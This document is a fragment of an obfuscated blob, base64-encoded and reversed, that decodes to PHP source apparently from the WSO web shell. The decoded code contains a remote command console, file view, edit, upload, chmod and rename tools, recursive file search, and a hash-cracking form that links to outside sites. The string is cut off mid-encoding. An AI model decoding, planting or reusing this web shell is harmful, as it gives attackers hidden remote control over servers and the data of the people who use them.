Fb3N3LiJuXCIuXScxcCdbVFNPUF8kLiIgJCIoc3JhaGNsYWljZXBzbG10aCBvaGNlCQkKeyApKV0nMXAnW1RTT1BfJCh5dHBtZSEoZmkJCjsnPnlsbm9kYWVyICI7MDpuaWdyYW07MDptb3R0b2ItcmVkcm9iIj1lbHl0cyB0dXB0dW89ZW1hbiBhZXJhZ2liPXNzYWxjIGFlcmF0eGV0PD4vcmI8PnJib24vPCkxJj4yKCB0dW9kdHMgb3QgcnJlZHRzIHRjZXJpZGVyID4nLiknJzonZGVrY2VoYyc/XSd0dW9fb3RfcnJlZHRzJy4pXSdUU09IX1BUVEgnW1JFVlJFU18kKDVkbVtFSUtPT0NfJHx8KV0nMnAnW1RTT1BfJCh5dHBtZSEoLicgMT1ldWxhdiBzcm9ycmVfd29ocz1lbWFuIHhvYmtjZWhjPWVweXQgdHVwbmk8IFhBSkEgZ25pc3UgZG5lcyA+Jy4pJyc6J2Rla2NlaGMnP10neGFqYScuKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG1bRUlLT09DXyRAKC4nIDE9ZXVsYXYgeGFqYT1lbWFuIHhvYmtjZWhjPWVweXQgdHVwbmk8PnJib248ID4iPj4iPWV1bGF2ICJ9OyknXCdcOjE/ZGVrY2VoYy5zcm9ycmVfd29ocy5mYy5kLGV1bGF2LnNhaWxhLmZjLmQsbGx1bixsbHVuKGd7ZXNsZX07KSdcJ1w6MT9kZWtjZWhjLnNyb3JyZV93b2hzLmZjLmQsZXVsYXYuc2FpbGEuZmMuZCxsbHVuLGxsdW4oYXspZGVrY2VoYy54YWphLmZjLmQoZmk7KWV1bGF2LnNhaWxhLmZjLmQoZGRhIj1rY2lsY25vIG5vdHR1Yj1lcHl0IHR1cG5pPD50Y2VsZXMvPCcgb2hjZQkKCQp9CQo7Jz5ub2l0cG8vPCcubiQuJz4iJy4pdiQoc3JhaGNsYWljZXBzbG10aC4nIj1ldWxhdiBub2l0cG88JyBvaGNlCQkKfQkJCjtldW5pdG5vYwkJCQo7Jz5wdW9yZ3Rwby88PiItJy4pbiQoc3JhaGNsYWljZXBzbG10aC4nLSI9bGViYWwgcHVvcmd0cG88JyBvaGNlCQkJCnsgKScnID09IHYkKGZpCQkKeyApdiQgPj0gbiQgc2EgXSdzZXNhaWxhJ1tTTEFCT0xHJChoY2Flcm9mCQo7Jz5zYWlsYT1lbWFuIHRjZWxlczw+Ijtlc2xhZiBucnV0ZXIgfTspJ1wnXDoxP2Rla2NlaGMuc3JvcnJlX3dvaHMuc2lodCxldWxhdi5kbWMuc2lodCxsbHVuLGxsdW4oZ3tlc2xlfTspJ1wnXDoxP2Rla2NlaGMuc3JvcnJlX3dvaHMuc2lodCxldWxhdi5kbWMuc2lodCxsbHVuLGxsdW4oYXspZGVrY2VoYy54YWphLnNpaHQoZmk7KWV1bGF2LmRtYy5zaWh0KGRkYX07ZXNsYWYgbnJ1dGVyOydcJ1w9ZXVsYXYuZG1jLmZjLmQ7J1wnXD1ldWxhdi50dXB0dW8uZmMuZHspJ1xyYWVsYydcPT1ldWxhdi5kbWMuZmMuZChmaSI9dGltYnVzbm8gZmM9ZW1hbiBtcm9mPD50bmV0bm9jPXNzYWxjIHZpZDw+MWgvPGVsb3Nub0M+MWg8JyBvaGNlCQo7Ij50cGlyY3MvPAp9CjsxLWh0Z25lbC5zZG1jID0gcnVjCQo7KScnKGhzdXAuc2RtYwkKOylkbWMoaHN1cC5zZG1jCQo7KShwb3Auc2RtYwkKeyApZG1jKGRkYSBub2l0Y251Zgp9Cn0JCjstLXJ1YwkJCQplc2xlCQkKO11ydWNbc2RtYyA9IGV1bGF2LmRtYy5mYy50bmVtdWNvZAkJCQopaHRnbmVsLnNkbWMgPCBydWMoZmkJCQo7KytydWMJCQp7ICkwNCA9PSBuKGZpIGVzbGUgfQkKOysrcnVjCQkJCmVzbGUJCQo7XXJ1Y1tzZG1jID0gZXVsYXYuZG1jLmZjLnRuZW11Y29kCQkJCikwPT5ydWMoZmkJCQo7LS1ydWMJCQp7ICk4MyA9PSBuKGZpCQo7ZWRvQ3llay5lIDogaGNpaHcuZSA/ICl0bmV2RS53b2RuaXcoID0gbiByYXYJCnsgKWUocGsgbm9pdGNudWYKOzAgPSBydWMgcmF2CjspJycoeWFyckEgd2VuID0gc2RtYyByYXYKOylOV09EWUVLLnRuZXZFKHN0bmV2RWVydXRwYWMud29kbml3ICl0bmV2RS53b2RuaXcoZmkKPnRwaXJjczwiIG9oY2UgICAgCjspKHJlZGFlSG9zdwkKOykwICwneGFqYScuKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG0oZWlrb29jdGVzT1NXCQkKKSldJzFwJ1tUU09QXyQoeXRwbWUhJiYpXSd4YWphJ1tUU09QXyQoeXRwbWUoZmkgICAgCn0JCjt0aXhlCQkKO3BtZXQkICwiblwiICwpcG1ldCQobmVscnRzIG9oY2UJCQo7KShuYWVsY190ZWdfYm8gPSBwbWV0JAkJCjsiO3RoZ2llSGxsb3Jjcy50dXB0dW8uZmMuZCA9IHBvVGxsb3Jjcy50dXB0dW8uZmMuZCIgb2hjZQkJCjsiOyciLnBtZXQkLiInPStldWxhdi50dXB0dW8uZmMuZCIgb2hjZQkJCn0JCQp9CQkJCjsiOyciLl0nZHdjJ1tTTEFCT0xHJC4iJz1fYyIgb2hjZQkJCQkKOykoZHdjdGVnQCA9IF0nZHdjJ1tTTEFCT0xHJAkJCQkKeyApKV0xW2hjdGFtJChyaWRoY0AoZmkJCQkKewkpKWhjdGFtJCxdJzFwJ1tUU09QXyQsIiEkKStdO15bKCtzXGRjKi4hIihoY3RhbV9nZXJwKGZpCQkKOykpIjBcJ1xcdFxyXG5cIiwpXScxcCdbVFNPUF8kKHhFb3N3LiJuXCIuXScxcCdbVFNPUF8kLiIgJG5cIihzZWhzYWxzY2RkYSAsJzgtRlRVJyAsXSd0ZXNyYWhjJ1tUU09QXyQodm5vY2lAID0gcG1ldCQJCQo7Im5cOycnPWV1bGF2LmRtYy5mYy5kIiBvaGNlCQkKOykodHJhdHNfYm8JCQo7KWV1cnQgLCd4YWphJy4pXSdUU09IX1BUVEgnW1JFVlJFU18kKDVkbShlaWtvb2N0ZXNPU1cJCQp7ICkpXSd4YWphJ1tUU09QXyQodGVzc2koZmkJCgo7KTAgLCd0dW9fb3RfcnJlZHRzJy4pXSdUU09IX1BUVEgnW1JFVlJFU18kKDVkbShlaWtvb2N0ZXNPU1cgICAgICAgIAopKV0nMXAnW1RTT1BfJCh5dHBtZSEoZmllc2xlIH0gICAgCjsnMSY+MiAnID0uIF0nMXAnW1RTT1BfJCAgICAgICAgCjspZXVydCAsJ3R1b19vdF9ycmVkdHMnLildJ1RTT0hfUFRUSCdbUkVWUkVTXyQoNWRtKGVpa29vY3Rlc09TVyAgICAgICAgCnsgKSldJzJwJ1tUU09QXyQoeXRwbWUhICYmICldJzFwJ1tUU09QXyQoeXRwbWUhKGZpICAgIAp7ICkoZWxvc25vQ25vaXRjYSBub2l0Y251ZgoKfQo7KShyZXRvb0Zvc3cJCjsnPnZpZC88JyBvaGNlCQp9CQo7a2FlcmIJCQkKOyc+bXJvZi88PiI+PiI9ZXVsYXYgdGltYnVzPWVweXQgdHVwbmk8PiInLikpXScxcCdbVFNPUF8kKGVtaXRtZWxpZkAgLCJzOmk6SCBkLW0tWSIoZXRhZC4nIj1ldWxhdiBoY3VvdD1lbWFuIHR4ZXQ9ZXB5dCB0dXBuaTw+Ijtlc2xhZiBucnV0ZXI7KWV1bGF2LmhjdW90LnNpaHQsbGx1biwnXCcgLiApXScxcCdbVFNPUF8kKGVkb2NuZWxydSAuICcnXCxsbHVuLGxsdW4oZyI9dGltYnVzbm8gbXJvZjw+dHBpcmNzLzw7IiI9XzNwPnRwaXJjczwnIG9oY2UJCQkKOykoZWhjYWN0YXRzcmFlbGMJCQkKfQkJCQo7JyF0YW1yb2YgZW1pdCBkYUInIG9oY2UgZXNsZSB9CQkJCQo7JyFkZWhjdW9UJyBvaGNlCQkJCQkJCmVzbGUJCQkJCQo7JyFsaWFGJyBvaGNlCQkJCQkJCikpZW1pdCQsZW1pdCQsXScxcCdbVFNPUF8kKGhjdW90IShmaQkJCQkJCnsgKWVtaXQkKGZpCQkJCQo7KV0nM3AnW1RTT1BfJChlbWl0b3RydHMgPSBlbWl0JAkJCQkKeyApICldJzNwJ1tUU09QXyQoeXRwbWUhIChmaQkJCQo6J2hjdW90JyBlc2FjCQkKO2thZXJiCQkJCjsnPm1yb2YvPD4iPj4iPWV1bGF2IHRpbWJ1cz1lcHl0IHR1cG5pPD4iJy4pXScxcCdbVFNPUF8kKHNyYWhjbGFpY2Vwc2xtdGguJyI9ZXVsYXYgZW1hbj1lbWFuIHR4ZXQ9ZXB5dCB0dXBuaTw+Ijtlc2xhZiBucnV0ZXI7KWV1bGF2LmVtYW4uc2lodCxsbHVuLCdcJyAuICldJzFwJ1tUU09QXyQoZWRvY25lbHJ1IC4gJydcLGxsdW4sbGx1bihnIj10aW1idXNubyBtcm9mPCcgb2hjZQkJCQp9CQkJCjspJz50cGlyY3MvPCkiIixsbHVuLCInLildJzNwJ1tUU09QXyQoZWRvY25lbHJ1LiciLGxsdW4sbGx1bihnPnRwaXJjczwnKGVpZAkJCQkJCmVzbGUJCQkJCjsnPnJiPCFlbWFuZXIgdCdcbmFDJyBvaGNlCQkJCQkKKSldJzNwJ1tUU09QXyQgLF0nMXAnW1RTT1BfJChlbWFuZXJAIShmaQkJCQkKeyApICldJzNwJ1tUU09QXyQoeXRwbWUhIChmaQkJCQo6J2VtYW5lcicgZXNhYwkJCjtrYWVyYgkJCQo7Jz5lbGJhdC88PnJ0Lzw+ZHQvPD5lcnAvPCcuKV0yW2gkKHNyYWhjbGFpY2Vwc2xtdGguJz5lcnA8PjMzMzMzMyM9cm9sb2NnYiBkdDw+ZHQvPD5lcnAvPCcuXTFbaCQuJz5lcnA8PjgyODI4MiM9cm9sb2NnYiBkdDw+ZHQvPD5uYXBzLzw+ZXJwLzwnLl0wW2gkLic+ZXJwPD4iO2xhbXJvbiA6dGhnaWV3LXRub2YiPWVseXRzIG5hcHM8PjMzMzMzMyM9cm9sb2NnYiBkdDw+cnQ8PjIyMjIyMiM9cm9sb2NnYiA1PWduaWRkYXBsbGVjIDE9Z25pY2Fwc2xsZWMgZWxiYXQ8JyBvaGNlCQkJCn0JIAkJCn0JCQkJCjsiblwiID0uIF0yW2gkCQkJCQkKOyc+cmI8JyA9LiBdMVtoJAkJCQkJCn07Jz5yYjwnLikxK2kkLCdYODAlJyhmdG5pcnBzID0uIF0wW2gkeyApbmVsJCA8IDEraSQoIGZpCQkJCQkKOzAgPSBuJAkJCQkJCnsgKTIzID09IG4kKCBmaQkJCQkKOysrbiQJCQkJCn0JCQkJCjtrYWVyYiA7XWkkW2MkID0uIF0yW2gkIDp0bHVhZmVkCQkJCQkKO2thZXJiIDsnICcgPS4gXTJbaCQgOjMxIGVzYWMJCQkJCQo7a2FlcmIgOycgJyA9LiBdMltoJCA6MDEgZXNhYwkJCQkJCjtrYWVyYiA7JyAnID0uIF0yW2gkICA6OSBlc2FjCQkJCQkKO2thZXJiIDsnICcgPS4gXTJbaCQgIDowIGVzYWMJCQkJCQp7ICkgKV1pJFtjJChkcm8gKCBoY3Rpd3MJCQkJCjsnICcuKSldaSRbYyQoZHJvLCdYMjAlJyhmdG5pcnBzID0uIF0xW2gkCQkJCQp7IClpJCsrIDtuZWwkPGkkIDswPWkkKCByb2YJCQkKOyljJChuZWxydHMgPSBuZWwkCQkJCjspJycsJycsJz5yYjwwMDAwMDAwMCcoeWFycmEgPSBoJAkJCQo7MCA9IG4kCQkJCjspXScxcCdbVFNPUF8kKHN0bmV0bm9jX3RlZ19lbGlmQCA9IGMkCQkJCjoncG11ZHhlaCcgZXNhYwkJCjtrYWVyYgkJCQo7Jz5tcm9mLzw+Ij4+Ij1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+YWVyYXR4ZXQvPCcgb2hjZQkJCQp9CQkJCjspcGYkKGVzb2xjZkAJCQkJCjspKTQyMDEgLHBmJChkYWVyZkAoc3JhaGNsYWljZXBzbG10aCBvaGNlCQkJCQkKKSApcGYkKGZvZWZAISAoZWxpaHcJCQkJCnsgKXBmJChmaQkJCQo7KSdyJyAsXScxcCdbVFNPUF8kKG5lcG9mQCA9IHBmJAkJCQo7Jz5hZXJhZ2liPXNzYWxjIHR4ZXQ9ZW1hbiBhZXJhdHhldDw+Ijtlc2xhZiBucnV0ZXI7KWV1bGF2LnR4ZXQuc2lodCsnXDEnXCxsbHVuLCdcJyAuICldJzFwJ1tUU09QXyQoZWRvY25lbHJ1IC4gJydcLGxsdW4sbGx1bihnIj10aW1idXNubyBtcm9mPCcgb2hjZQkJCQp9CQkJCn0JCQkJCjspZW1pdCQsZW1pdCQsXScxcCdbVFNPUF8kKGhjdW90QAkJCQkJCjsnPnRwaXJjcy88OyIiPV8zcD50cGlyY3M8PnJiPCFkZXZhUycgb2hjZQkJCQkJCjspcGYkKGVzb2xjZkAJCQkJCQo7KV0nM3AnW1RTT1BfJCxwZiQoZXRpcndmQAkJCQkJCnsgKXBmJChmaQkJCQkKOykidyIsXScxcCdbVFNPUF8kKG5lcG9mQCA9IHBmJAkJCQkKOykxLF0nM3AnW1RTT1BfJChydHNidXMgPSBdJzNwJ1tUU09QXyQJCQkJCjspXScxcCdbVFNPUF8kKGVtaXRtZWxpZkAgPSBlbWl0JAkJCQkKeyApICldJzNwJ1tUU09QXyQoeXRwbWUhIChmaQkJCQp9CQkJCjtrYWVyYgkJCQkKOydlbGJhZXRpcncgdCdcbnNpIGVsaUYnIG9oY2UJCQkJCnsgKSldJzFwJ1tUU09QXyQoZWxiYXRpcndfc2khIChmaQkJCQo6J3RpZGUnIGVzYWMJCQo7a2FlcmIJCQkKOyc+bXJvZi88PiI+PiI9ZXVsYXYgdGltYnVzPWVweXQgdHVwbmk8PiInLik0LSwpKV0nMXAnW1RTT1BfJChzbXJlcGVsaWYgLCdvJScoZnRuaXJwcyhydHNidXMuJyI9ZXVsYXYgZG9taGM9ZW1hbiB0eGV0PWVweXQgdHVwbmk8PiI7ZXNsYWYgbnJ1dGVyOylldWxhdi5kb21oYy5zaWh0LGxsdW4sJ1wnIC4gKV0nMXAnW1RTT1BfJChlZG9jbmVscnUgLiAnJ1wsbGx1bixsbHVuKGciPXRpbWJ1c25vIG1yb2Y8PnRwaXJjcy88OyIiPV8zcD50cGlyY3M8JyBvaGNlCQkJCjspKGVoY2FjdGF0c3JhZWxjCQkJCn0JCQkKOyc+dHBpcmNzLzw7IiI9ZXVsYXYuM3AuZm0udG5lbXVjb2Q+dHBpcmNzPD5yYjwhc25vaXNzaW1yZXAgdGVzIHQnXG5hQycgb2hjZQkJCQkJCikpc21yZXAkICxdJzFwJ1tUU09QXyQoZG9taGNAIShmaQkJCQkKOykpMS1pJC0pXSczcCdbVFNPUF8kKG5lbHJ0cyggLDgod29wKl1pJFtdJzNwJ1tUU09QXyQpdG5pKCA9KyBzbXJlcCQJCQkJCQopaSQtLTswPT5pJDsxLSldJzNwJ1tUU09QXyQobmVscnRzPWkkKHJvZgkJCQkKOzAgPSBzbXJlcCQJCQkJCnsgKSApXSczcCdbVFNPUF8kKHl0cG1lISAoZmkJCQkKOidkb21oYycgZXNhYwkJCjtrYWVyYgkJCQp9CQkJCjsnPnZpZC88Jy4pZWRvYyQsKSc+dG5vZi88JywnIHRub2Y8Jyh5YXJyYSAsKSc+bmFwcy88JywnIG5hcHM8Jyh5YXJyYShlY2FscGVyX3J0cyBvaGNlCQkJCQo7KWV1cnQsXScxcCdbVFNPUF8kKGVsaWZfdGhnaWxoZ2loQCA9IGVkb2MkCQkJCQo7Jz4iO2tjYWxiOnJvbG9jOzFlMWUxZSMgOnJvbG9jLWRudW9yZ2tjYWIiPWVseXRzIDFsbT1zc2FsYyB2aWQ8JyBvaGNlCQkJCQp7ICkgKV0nMXAnW1RTT1BfJChlbGJhZGFlcl9zaUAgKGZpCQkJCjondGhnaWxoZ2loJyBlc2FjCQkKO2thZXJiCQkJCjsnPmVycC88JyBvaGNlCQkJCn0JCQkKOylwZiQoZXNvbGNmQAkJCQkKOykpNDIwMSAscGYkKGRhZXJmQChzcmFoY2xhaWNlcHNsbXRoIG9oY2UJCQkJCQopIClwZiQoZm9lZkAhIChlbGlodwkJCQkKeyApcGYkKGZpCQkJCjspJ3InICxdJzFwJ1tUU09QXyQobmVwb2ZAID0gcGYkCQkJCjsnPjFsbT1zc2FsYyBlcnA8JyBvaGNlCQkJCjond2VpdicgZXNhYwkJCnsgKV0nMnAnW1RTT1BfJChoY3Rpd3MJCjsnPnJiPD5yYjwnIG9oY2UJCjsnID5hLzwnLil2JDonPmIvPF0gJy52JC4nIFs+YjwnPyldJzJwJ1tUU09QXyRAPT0pdiQocmV3b2xvdHJ0cygoLic+IiknXCcuKXYkKHJld29sb3RydHMuJydcLCdcJyAuICldJzFwJ1tUU09QXyQoZWRvY25lbHJ1IC4gJydcLGxsdW4sbGx1bihnIj1rY2lsY25vICM9ZmVyaCBhPCcgb2hjZQkJCil2JCBzYSBtJChoY2Flcm9mCQo7KSdoY3VvVCcgLCdlbWFuZVInICwnZG9taEMnKHlhcnJhID0gbSQJCQplc2xlCQo7KSdoY3VvVCcgLCdlbWFuZVInICwnZG9taEMnICwndGlkRScgLCdwbXVkeGVIJyAsJ2Rhb2xud29EJyAsJ3RoZ2lsaGdpSCcgLCd3ZWlWJyh5YXJyYSA9IG0kCQkKKSApXScxcCdbVFNPUF8kKGVsaWZfc2kgKGZpCQo7J3dlaXYnID0gXScycCdbVFNPUF8kCQkKKSApXScycCdbVFNPUF8kKHl0cG1lIChmaQkKOyc+cmI8PnJiPCcuKSldJzFwJ1tUU09QXyQoZW1pdG1lbGlmLCdzOmk6SCBkLW0tWScoZXRhZC4nID5uYXBzLzw6ZW1pdCB5Zmlkb00+bmFwczwgJy4pKV0nMXAnW1RTT1BfJChlbWl0YWVsaWYsJ3M6aTpIIGQtbS1ZJyhldGFkLicgPm5hcHMvPDplbWl0IHNzZWNjQT5uYXBzPCAnLikpXScxcCdbVFNPUF8kKGVtaXRjZWxpZiwnczppOkggZC1tLVknKGV0YWQuJyA+bmFwcy88OmVtaXQgZWduYWhDPm5hcHM8JyBvaGNlCQo7Jz5yYjwnLl0nZW1hbidbZGlnJC4nLycuXSdlbWFuJ1tkaXUkLicgPm5hcHMvPDpwdW9yRy9yZW53Tz5uYXBzPCAnLildJzFwJ1tUU09QXyQocm9sb0NzbXJlUG9zdy4nID5uYXBzLzw6bm9pc3NpbXJlUD5uYXBzPCAnLiknLSc6KSldJzFwJ1tUU09QXyQoZXppc2VsaWYoZXppU3dlaVZvc3c/KV0nMXAnW1RTT1BfJChlbGlmX3NpKC4nID5uYXBzLzw6ZXppUz5uYXBzPCAnLikpXScxcCdbVFNPUF8kKGVtYW5lc2FiQChzcmFoY2xhaWNlcHNsbXRoLicgPm5hcHMvPDplbWFOPm5hcHM8JyBvaGNlCQo7KSldJzFwJ1tUU09QXyQocHVvcmdlbGlmQChkaWdyZ3RlZ194aXNvcEAgPSBkaWckIGVzbGUgfQkKOyldJzFwJ1tUU09QXyQocHVvcmdlbGlmQCA9IF0nZW1hbidbZGlnJAkJCjspXScxcCdbVFNPUF8kKHJlbndvZWxpZkAgPSBdJ2VtYW4nW2RpdSQJCQp7IClkaXUkIShmaQkKOykpXScxcCdbVFNPUF8kKHJlbndvZWxpZkAoZGl1d3B0ZWdfeGlzb3BAID0gZGl1JAkKfQkKO25ydXRlcgkJCjspKHJldG9vRm9zdwkJCjsnc3RzaXhlIHRvbiBlbGlGJyBvaGNlCQkKeyApICldJzFwJ1tUU09QXyRAKHN0c2l4ZV9lbGlmISAoZmkJCjsnPnRuZXRub2M9c3NhbGMgdmlkPD4xaC88c2xvb3QgZWxpRj4xaDwnIG9oY2UJCjspKHJlZGFlSG9zdwkKfQkKfQkJCn0JCQkKOylwZiQoZXNvbGNmCQkJCQo7InRpZGUiID0gXScycCdbVFNPUF8kCQkJCQp7IClwZiQoZmkJCQkKOykndycgLF0nMXAnW1RTT1BfJChuZXBvZkAgPSBwZiQJCQkKeyApKV0nMXAnW1RTT1BfJChzdHNpeGVfZWxpZiEoZmkJCQp7ICkgJ2VsaWZrbScgPT0gXScycCdbVFNPUF8kQCAoZmkJCn0JCjt0aXhlfQkJCn0JCQkKOylwZiQoZXNvbGNmCQkJCQo7KTQyMDEgLHBmJChkYWVyZkAgb2hjZQkJCQkJCikpcGYkKGZvZWZAIShlbGlodwkJCQkKeyApcGYkKGZpCQkJCjspInIiICxdJzFwJ1tUU09QXyQobmVwb2ZAID0gcGYkCQkJCjspIm1hZXJ0cy10ZXRjby9ub2l0YWNpbHBwYSA6ZXB5VC10bmV0bm9DIihyZWRhZWggICAgICAgICAgICAgICAgCmVzbGUgfQkJCQo7KWVweXQkIC4gIiA6ZXB5VC10bmV0bm9DIihyZWRhZWgJCQkJCjspXScxcCdbVFNPUF8kKGVweXRfdG5ldG5vY19lbWltQCA9IGVweXQkCQkJCQp7ICkpImVweXRfdG5ldG5vY19lbWltIihzdHNpeGVfbm9pdGNudWYoIGZpCQkJCjspKV0nMXAnW1RTT1BfJChlbWFuZXNhYi4iPWVtYW5lbGlmIDt0bmVtaGNhdHRhIDpub2l0aXNvcHNpRC10bmV0bm9DIihyZWRhZWgJCQkKOyk2OTA0ICwicmVsZG5haHpnX2JvIih0cmF0c19ibwkJCQp7ICkpXScxcCdbVFNPUF8kKGVsYmFkYWVyX3NpQCAmJiApXScxcCdbVFNPUF8kKGVsaWZfc2lAKGZpCQkKeyApJ2Rhb2xud29kJz09XScycCdbVFNPUF8kQChmaQkKOyldJzFwJ1tUU09QXyQoZWRvY2VkbHJ1ID0gXScxcCdbVFNPUF8kCQkKKSApXScxcCdbVFNPUF8kKHRlc3NpIChmaQkKeyApKHNsb29Uc2VsaUZub2l0Y2Egbm9pdGNudWYKCn0KOykocmV0b29Gb3N3CQo7Ij52aWQvPD5tcm9mLzwJCQo+cmI8PiJcKSh0aW1idXMuZmgudG5lbXVjb2Q7J3BocC54ZWRuaS9lbS5yb2ZrY2FyYy8vOnB0dGgnPW5vaXRjYS5maC50bmVtdWNvZCJcPWtjaWxjbm8gJ2VtLnJvZmtjYXJjJz1ldWxhdiAnbm90dHViJz1lcHl0IHR1cG5pPCAgICAgICAgICAgIAo+cmI8PiJcKSh0aW1idXMuZmgudG5lbXVjb2Q7JzVkbT1zJicrZXVsYXYuaHNhaC5maC50bmVtdWNvZCsnPXE/L21vYy5lemlvbmRlci41ZG0vLzpwdHRoJz1ub2l0Y2EuZmgudG5lbXVjb2QiXD1rY2lsY25vICdtb2MuZXppb25kZXIuNWRtJz1ldWxhdiAnbm90dHViJz1lcHl0IHR1cG5pPAkJCQo+cmI8PiJcKSh0aW1idXMuZmgudG5lbXVjb2Q7J3BocC54ZWRuaS91ci5nbmlrY2FyY2hzYWgvLzpzcHR0aCc9bm9pdGNhLmZoLnRuZW11Y29kIlw9a2NpbGNubyAndXIuZ25pa2NhcmNoc2FoJz1ldWxhdiAnbm90dHViJz1lcHl0IHR1cG5pPAkJCQo+LydkbmlmJz1ldWxhdiAndGNhJz1lbWFuICduZWRkaWgnPWVweXQgdHVwbmk8ICAgICAgICAgICAgCj5yYjw+Jzt4cDAwMjpodGRpdyc9ZWx5dHMgJ2hzYWgnPWVtYW4gJ3R4ZXQnPWVweXQgdHVwbmk8CQkJCj4nZmgnPWVtYW4gJ2tuYWxiXyc9dGVncmF0ICd0c29wJz1kb2h0ZW0gbXJvZjwJCQo+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzw6aHNhaCByb2YgaGNyYWVTPjFoPD5yYjw+dmlkLzwiIG9oY2UJCjspXSdjJ1tUU09QXyQoYm9sR2V2aXNydWNlUm9zdwkJCildJzNwJ1tUU09QXyRAKGZpCQp9CQp9CQkKfQkJCQp9CQkJCQo7Ij5yYjw+YS88Ii4pbWV0aSQoc3JhaGNsYWljZXBzbG10aC4iPicpIlwiXCwiXHdlaXYiXCAsIlwiLiltZXRpJChlZG9jbmVscnUuIiJcLGxsdW4sIlxzbG9vVHNlbGlGIlwoZyc9a2NpbGNubyAnIyc9ZmVyaCBhPCIgb2hjZQkJCQkJCQopZXNsYWY9PSEpXScycCdbVFNPUF8kICwpbWV0aSQoc3RuZXRub2NfdGVnX2VsaWYoc29wcnRzQCB8fCApXScycCdbVFNPUF8kKHl0cG1lKGZpCQkJCQkKeyBlc2xlIH0JCQkJCjspbWV0aSQoYm9sR2V2aXNydWNlUm9zdwkJCQkJCQopbWV0aSQ9IWh0YXAkKGZpCQkJCQkKeykpbWV0aSQocmlkX3NpQChmaQkJCQkKeyApbWV0aSQgc2Egc2h0YXAkKGhjYWVyb2YJCQkKeyApKXNodGFwJCh0bnVvY0AmJilzaHRhcCQoeWFycmFfc2koZmkJCQo7KSkpUklEWUxOT19CT0xHICwnKicuaHRhcCQoYm9sZ0AgLCldJzNwJ1tUU09QXyQuaHRhcCQoYm9sZ0AoZWdyZW1feWFycmFAKGV1cWludV95YXJyYUAgPSBzaHRhcCQJCQo7Jy8nPS5odGFwJAkJCQopJy8nID0hICkxLSAsaHRhcCQocnRzYnVzKGZpCQkKeyApaHRhcCQoYm9sR2V2aXNydWNlUm9zdyBub2l0Y251ZgkKCjsiPm1yb2YvPD5lbGJhdC88CQkJCj5ydC88PmR0Lzw+Jz4+Jz1ldWxhdiAndGltYnVzJz1lcHl0IHR1cG5pPD5kdDw+ZHQvPD5kdDw+cnQ8CQkJCj5ydC88PmR0Lzw+JyUwMDE6aHRkaXcnPWVseXRzICcqJz1ldWxhdiAnZW1hbmVsaWYnPWVtYW4gJ3R4ZXQnPWVweXQgdHVwbmk8PmR0PD5kdC88OmVtYU4+ZHQ8PnJ0PAkJCQo+cnQvPD5kdC88PiclMDAxOmh0ZGl3Jz1lbHl0cyAnIi4gKV0nZHdjJ1tTTEFCT0xHJChzcmFoY2xhaWNlcHNsbXRoIC4iJz1ldWxhdiAnZHdjJz1lbWFuICd0eGV0Jz1lcHl0IHR1cG5pPD5kdDw+ZHQvPDpodGFQPmR0PD5ydDwJCQkKPnJ0Lzw+ZHQvPD4nJTAwMTpodGRpdyc9ZWx5dHMgJ3R4ZXQnPWVtYW4gJ3R4ZXQnPWVweXQgdHVwbmk8PmR0PD5kdC88OnR4ZVQ+JyUxJz1odGRpdyBkdDw+cnQ8CQkJCj4nJTA1Jz1odGRpdyAnMCc9Z25pY2Fwc2xsZWMgJzEnPWduaWRkYXBsbGVjIGVsYmF0PD4iXDtlc2xhZiBucnV0ZXI7KWV1bGF2LmVtYW5lbGlmLnNpaHQsZXVsYXYudHhldC5zaWh0LGxsdW4sZXVsYXYuZHdjLnNpaHQsbGx1bihnIlw9dGltYnVzbm8gbXJvZjwJCQo+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzw6c2VsaWYgaGNyYWVTPjFoPD5yYjw+dmlkLzw+ZXJwLzwib2hjZQkKfQkKOykpXScycCdbVFNPUF8kKF0nMXAnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoIG9oY2UpKXNsb29UZ25pcnRzJCAsXScxcCdbVFNPUF8kKHlhcnJhX25pKGZpCQkKeyApKV0nMXAnW1RTT1BfJCh5dHBtZSEoZmkJCjsiPid0dXB0dU9ydHMnPWRpICd4cDU6cG90LW5pZ3JhbSIuKScnOic7ZW5vbjp5YWxwc2lkJz8pXScxcCdbVFNPUF8kKHl0cG1lKC4iJz1lbHl0cyAnMWxtJz1zc2FsYyBlcnA8Pm1yb2YvPD5hZXJhdHhldC88Ii4pKV0nMnAnW1RTT1BfJEAoc3JhaGNsYWljZXBzbG10aDonJz8pXScxcCdbVFNPUF8kKHl0cG1lKC4iPmFlcmFnaWI9c3NhbGMgJ3hwNTpwb3QtbmlncmFtJz1lbHl0cyAndHVwbmknPWVtYW4gYWVyYXR4ZXQ8PnJiPFhBSkEgZ25pc3UgZG5lcyA+Ii4pJyc6J2Rla2NlaGMnP10neGFqYScuKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG1bRUlLT09DXyRAKC4iIDE9ZXVsYXYgeGFqYT1lbWFuIHhvYmtjZWhjPWVweXQgdHVwbmk8ID4vJz4+Jz1ldWxhdiAndGltYnVzJz1lcHl0IHR1cG5pPD50Y2VsZXMvPCIgb2hjZQkJCjsiPm5vaXRwby88Ii5rJC4iPiciLil2JChzcmFoY2xhaWNlcHNsbXRoLiInPWV1bGF2IG5vaXRwbzwiIG9oY2UJCQopdiQgPj0gayQgc2Egc2xvb1RnbmlydHMkKGhjYWVyb2YJCjsiPidsb29UdGNlbGVzJz1lbWFuIHRjZWxlczw+Jztlc2xhZiBucnV0ZXIgfTspZXVsYXYudHVwbmkuc2lodCxldWxhdi5sb29UdGNlbGVzLnNpaHQsbGx1bixsbHVuKGd7ZXNsZX07KWV1bGF2LnR1cG5pLnNpaHQsZXVsYXYubG9vVHRjZWxlcy5zaWh0LGxsdW4sbGx1bihheylkZWtjZWhjLnhhamEuc2lodChmaSc9dGltYnVTbm8gJ21yb0ZzbG9vdCc9ZW1hbiBtcm9mPCIgb2hjZQkKOyc+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzxzbm9pc3Jldm5vYyBnbmlydFM+MWg8JyBvaGNlCQo7KShyZWRhZUhvc3cJCjspMCAsJ3hhamEnLildJ1RTT0hfUFRUSCdbUkVWUkVTXyQoNWRtKGVpa29vY3Rlc09TVwkJCikpXScxcCdbVFNPUF8kKHl0cG1lISYmKV0neGFqYSdbV